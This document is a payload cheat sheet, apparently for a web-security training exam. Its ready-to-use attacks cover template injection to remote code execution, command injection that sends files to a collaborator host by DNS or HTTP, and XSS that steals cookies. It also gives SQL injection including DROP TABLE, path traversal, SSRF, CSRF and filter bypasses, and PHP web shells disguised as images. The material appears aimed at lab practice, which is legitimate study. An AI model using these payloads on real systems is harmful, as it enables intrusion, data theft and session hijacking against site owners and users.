# SSTI (Server-Side Template Injection) Payloads

## Detection

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

## Jinja2 (Python)

### Read File
```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}
```

### RCE
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
```

## Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("cat /home/carlos/secret") }
```

## Velocity (Java)

```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('cat /home/carlos/secret'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/carlos/secret")}}
{{['cat /home/carlos/secret']|filter('system')}}
```

## ERB (Ruby)

```ruby
<%= system('cat /home/carlos/secret') %>
<%= `cat /home/carlos/secret` %>
```

## Tornado (Python)

```python
{% import os %}
{{ os.popen('cat /home/carlos/secret').read() }}
```

# OS Command Injection Payloads

## DNS Exfiltration (RECOMMENDED)

### Read File via DNS
```bash
||nslookup $(cat /home/carlos/secret).burp.oastify.com||
||nslookup `cat /home/carlos/secret`.burp.oastify.com||
```

### Alternative Syntax
```bash
;nslookup $(cat /home/carlos/secret).burp.oastify.com;
|nslookup $(cat /home/carlos/secret).burp.oastify.com|
&nslookup $(cat /home/carlos/secret).burp.oastify.com&
```

## HTTP Exfiltration

### Using curl
```bash
||curl burp.oastify.com?c=$(cat /home/carlos/secret)||
||curl burp.oastify.com --data "$(cat /home/carlos/secret)"||
```

### Using wget
```bash
||wget --post-data=$(cat /home/carlos/secret) burp.oastify.com||
```

## Detection Payloads

### Time-Based
```bash
||sleep 10||
||ping -c 10 127.0.0.1||
```

### Out-of-Band
```bash
||nslookup burp.oastify.com||
||curl burp.oastify.com||
```

## Command Separators

```bash
;    # Semicolon
|    # Pipe
||   # OR
&    # Background
&&   # AND
%0a  # Newline
%0d  # Carriage return
`    # Backticks
$()  # Command substitution
```

## Bypass Techniques

### Space Bypass
```bash
cat${IFS}/home/carlos/secret
cat%09/home/carlos/secret
cat$IFS$9/home/carlos/secret
```

### Keyword Filtering
```bash
c''at /home/carlos/secret
c\at /home/carlos/secret
```

## Quick Reference

**Always use DNS exfiltration on exam!**
```bash
||nslookup $(cat /home/carlos/secret).burp.oastify.com||
```

# Path Traversal Payloads

## Basic Payloads

### Linux/Unix
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
```

### Target File
```
../../../home/carlos/secret
../../../../home/carlos/secret
../../../../../home/carlos/secret
```

## Absolute Path
```
/etc/passwd
/home/carlos/secret
```

## Bypass Techniques

### Non-Recursive Stripping
```
....//....//....//etc/passwd
....//....//....//home/carlos/secret
```

### URL Encoding
```
..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2fhome%2fcarlos%2fsecret
```

### Double URL Encoding
```
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252fhome%252fcarlos%252fsecret   (in case of waf blocking, encode chars too)
```

### Full Path Encoding (WAF Bypass)
```
%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```

### Start Path Validation
```
/var/www/images/../../../etc/passwd
/var/www/images/../../../home/carlos/secret
```

### Null Byte (Old Systems)
```
../../../etc/passwd%00.png
../../../home/carlos/secret%00.png
```

### Windows Backslash
```
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\home\carlos\secret
```


## XSS Bypass Alternatives

### Scenario: Angle Brackets Blocked

**Option 1:** Event handler in existing tag
```
" autofocus onfocus=alert(1) x="
```

**Option 2:** Attribute injection
```
" onmouseover="alert(1)
```

**Option 3:** Accesskey (requires user interaction)
```
" accesskey="x" onclick="alert(1)
```

**Option 4:** Onload in existing context
```
" onload="alert(1)
```

---

### Scenario: Script Tag Blocked

**Option 1:** IMG tag
```html
<img src=x onerror=alert(1)>
```

**Option 2:** SVG
```html
<svg onload=alert(1)>
```

**Option 3:** Body tag
```html
<body onload=alert(1)>
```

**Option 4:** Custom tag
```html
<xss id=x onfocus=alert(1) tabindex=1>#x
```

**Option 5:** Iframe
```html
<iframe src="javascript:alert(1)">
```

**Option 6:** Object
```html
<object data="javascript:alert(1)">
```

---

### Scenario: Parentheses Blocked

**Option 1:** Backticks (template literals)
```
<img src=x onerror=alert`1`>
```

**Option 2:** Throw + onerror
```
<img src=x onerror="throw onerror=alert,1">
```

**Option 3:** Hex encoding
```
<img src=x onerror=alert\x281\x29>
```

**Option 4:** Unicode encoding
```
<img src=x onerror=alert\u00281\u0029>
```

---

### Scenario: Quotes Blocked

**Option 1:** No quotes needed
```html
<img src=x onerror=alert(1)>
```

**Option 2:** Backticks
```html
<img src=x onerror=alert`1`>
```

**Option 3:** String.fromCharCode
```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

**Option 4:** HTML entities
```html
<img src=x onerror=alert(&apos;XSS&apos;)>
```

---

### Scenario: Space Blocked

**Option 1:** Tab character
```html
<img	src=x	onerror=alert(1)>
```

**Option 2:** Newline
```html
<img
src=x
onerror=alert(1)>
```

**Option 3:** Forward slash (in some contexts)
```html
<img/src=x/onerror=alert(1)>
```

---

### Scenario: Event Handler Blocked (onclick, onerror, etc.)

**Option 1:** onfocus + autofocus
```html
<input onfocus=alert(1) autofocus>
```

**Option 2:** onanimationstart
```html
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>
```

**Option 3:** ontoggle
```html
<details open ontoggle=alert(1)>
```

**Option 4:** onbegin (SVG)
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

**Option 5:** onresize
```html
<body onresize=alert(1)>
```

**Option 6:** onpageshow
```html
<body onpageshow=alert(1)>
```

---

### Scenario: innerHTML Context (Script Tags Don't Execute)

**Option 1:** IMG with onerror
```html
<img src=x onerror=alert(1)>
```

**Option 2:** SVG with onload
```html
<svg onload=alert(1)>
```

**Option 3:** Input with autofocus
```html
<input onfocus=alert(1) autofocus>
```

**Option 4:** Details with ontoggle
```html
<details open ontoggle=alert(1)>
```

---

### Scenario: Replace() Filtering (Only First Occurrence)

**Option 1:** Double the filtered string
```html
<><img src=x onerror=alert(1)>
```

**Option 2:** Nested tags
```html
<scr<script>ipt>alert(1)</script>
```

**Option 3:** Case variation
```html
<ScRiPt>alert(1)</sCrIpT>
```

---

### Scenario: Cookie Exfiltration Variations

**Option 1:** Fetch API
```js
fetch('https://COLLAB.oastify.com?c='+document.cookie)
```

**Option 2:** Image src
```js
new Image().src='https://COLLAB.oastify.com?c='+document.cookie
```

**Option 3:** XMLHttpRequest
```js
var xhr=new XMLHttpRequest();xhr.open('GET','https://COLLAB.oastify.com?c='+document.cookie);xhr.send()
```

**Option 4:** Location redirect
```js
location='https://COLLAB.oastify.com?c='+document.cookie
```

**Option 5:** Navigator.sendBeacon
```js
navigator.sendBeacon('https://COLLAB.oastify.com',document.cookie)
```

---

## SQL Injection Bypass Alternatives

### Scenario: Spaces Blocked

**Option 1:** Comments
```sql
'/**/OR/**/1=1--
```

**Option 2:** Tabs
```sql
'	OR	1=1--
```

**Option 3:** Newlines
```sql
'
OR
1=1--
```

**Option 4:** Parentheses
```sql
'OR(1=1)--
```

---

### Scenario: OR Blocked

**Option 1:** Use AND
```sql
'AND'1'='1
```

**Option 2:** Use ||
```sql
'||'1'='1
```

**Option 3:** Use UNION
```sql
'UNION SELECT NULL--
```

---

### Scenario: Quotes Blocked

**Option 1:** Hex encoding
```sql
admin'--
0x61646d696e--
```

**Option 2:** CHAR function
```sql
CHAR(97,100,109,105,110)
```

**Option 3:** Numeric comparison
```sql
1 OR 1=1--
```

---

### Scenario: Comments Blocked (-- or #)

**Option 1:** Use semicolon
```sql
'; DROP TABLE users;
```

**Option 2:** Close with valid syntax
```sql
' OR '1'='1' AND 'x'='x
```

**Option 3:** Use /* */ comments
```sql
' OR 1=1/*
```

---

### Scenario: UNION Blocked

**Option 1:** Case variation
```sql
' UnIoN SeLeCt NULL--
```

**Option 2:** Comments between
```sql
' UN/**/ION SE/**/LECT NULL--
```

**Option 3:** URL encoding
```sql
' %55NION %53ELECT NULL--
```

---

### Scenario: SELECT Blocked

**Option 1:** Case variation
```sql
' UNION SeLeCt NULL--
```

**Option 2:** Comments
```sql
' UNION SEL/**/ECT NULL--
```

**Option 3:** Double encoding
```sql
' UNION %53%45%4C%45%43%54 NULL--
```

---

## Path Traversal Bypass Alternatives

### Scenario: ../ Blocked

**Option 1:** Absolute path
```
/etc/passwd
```

**Option 2:** URL encoding
```
..%2f..%2f..%2fetc%2fpasswd
```

**Option 3:** Double URL encoding
```
..%252f..%252f..%252fetc%252fpasswd
```

**Option 4:** Nested encoding
```
....//....//....//etc/passwd
```

**Option 5:** Unicode encoding
```
..%c0%af..%c0%af..%c0%afetc/passwd
```

**Option 6:** Backslash (Windows)
```
..\..\..\etc\passwd
```

---

### Scenario: Keyword Blocked (e.g., "passwd", "secret")

**Option 1:** Hex encoding
```
/etc/%70%61%73%73%77%64
```

**Option 2:** Double hex encoding
```
/etc/%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

**Option 3:** Mixed encoding
```
/etc/p%61sswd
```

**Option 4:** Case variation (if case-insensitive)
```
/etc/PaSsWd
```

---

## Command Injection Bypass Alternatives

### Scenario: Spaces Blocked

**Option 1:** ${IFS}
```bash
cat${IFS}/etc/passwd
```

**Option 2:** $IFS$9
```bash
cat$IFS$9/etc/passwd
```

**Option 3:** Tab character
```bash
cat	/etc/passwd
```

**Option 4:** Brace expansion
```bash
{cat,/etc/passwd}
```

---

### Scenario: cat Blocked

**Option 1:** Less
```bash
less /etc/passwd
```

**Option 2:** More
```bash
more /etc/passwd
```

**Option 3:** Head
```bash
head /etc/passwd
```

**Option 4:** Tail
```bash
tail /etc/passwd
```

**Option 5:** nl (number lines)
```bash
nl /etc/passwd
```

**Option 6:** Base64 encode
```bash
base64 /etc/passwd
```

**Option 7:** Wildcard bypass
```bash
c''at /etc/passwd
ca\t /etc/passwd
c*t /etc/passwd
```

---

### Scenario: Pipe (|) Blocked

**Option 1:** Semicolon
```bash
;whoami;
```

**Option 2:** Ampersand
```bash
&whoami&
```

**Option 3:** Newline
```bash
%0awhoami%0a
```

**Option 4:** Backticks
```bash
`whoami`
```

**Option 5:** $()
```bash
$(whoami)
```

---

## CSRF Bypass Alternatives

### Scenario: Referer Validation

**Option 1:** Remove Referer header
```html
<meta name="referrer" content="never">
```

**Option 2:** Add domain to query string
```
/?TARGET.web-security-academy.net
```

**Option 3:** Add domain to path
```
/TARGET.web-security-academy.net/exploit
```

**Option 4:** Subdomain
```
https://TARGET.attacker.com
```

---

### Scenario: CSRF Token Required

**Option 1:** Remove token parameter
```
(just don't send it)
```

**Option 2:** Empty token value
```
csrf=
```

**Option 3:** Use another user's token
```
csrf=ANOTHER_USER_TOKEN
```

**Option 4:** Duplicate in cookie (CRLF injection)
```
%0d%0aSet-Cookie:%20csrf=fake
```

**Option 5:** Change request method
```
POST → GET
```

---

## SSRF Bypass Alternatives

### Scenario: localhost Blocked

**Option 1:** 127.0.0.1
```
http://127.0.0.1
```

**Option 2:** 127.1
```
http://127.1
```

**Option 3:** Decimal IP
```
http://2130706433
```

**Option 4:** Hex IP
```
http://0x7f000001
```

**Option 5:** Octal IP
```
http://0177.0.0.1
```

**Option 6:** IPv6
```
http://[::1]
```

**Option 7:** Domain pointing to localhost
```
http://localtest.me
http://127.0.0.1.nip.io
```

---

### Scenario: http:// Blocked

**Option 1:** https://
```
https://localhost
```

**Option 2:** file://
```
file:///etc/passwd
```

**Option 3:** gopher://
```
gopher://localhost
```

**Option 4:** dict://
```
dict://localhost
```

---

## File Upload Bypass Alternatives

### Scenario: .php Extension Blocked

**Option 1:** .php5
```
shell.php5
```

**Option 2:** .phtml
```
shell.phtml
```

**Option 3:** .phar
```
shell.phar
```

**Option 4:** .php3, .php4, .php7
```
shell.php3
```

**Option 5:** Case variation
```
shell.pHp
shell.PhP
```

**Option 6:** Null byte (older systems)
```
shell.php%00.jpg
```

**Option 7:** Double extension
```
shell.php.jpg
```

---

### Scenario: Content-Type Validation

**Option 1:** Change to image/jpeg
```
Content-Type: image/jpeg
```

**Option 2:** Change to image/png
```
Content-Type: image/png
```

**Option 3:** Change to image/gif
```
Content-Type: image/gif
```

---

### Scenario: Magic Bytes Check

**Option 1:** GIF header
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

**Option 2:** PNG header
```php
\x89PNG\r\n\x1a\n
<?php system($_GET['cmd']); ?>
```

**Option 3:** JPEG header
```php
\xFF\xD8\xFF\xE0
<?php system($_GET['cmd']); ?>
```

**Option 4:** Polyglot with exiftool
```bash
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg -o shell.php
```

---

## Encoding Bypass Cheat Sheet

### URL Encoding
```
space → %20
/ → %2f
\ → %5c
. → %2e
: → %3a
```

### Double URL Encoding
```
/ → %252f
\ → %255c
. → %252e
```

### HTML Entity Encoding
```
' → &apos;
" → &quot;
< → &lt;
> → &gt;
```

### Hex Encoding
```
a → \x61
( → \x28
) → \x29
+ → \x2b
```

### Unicode Encoding
```
a → \u0061
( → \u0028
) → \u0029
```
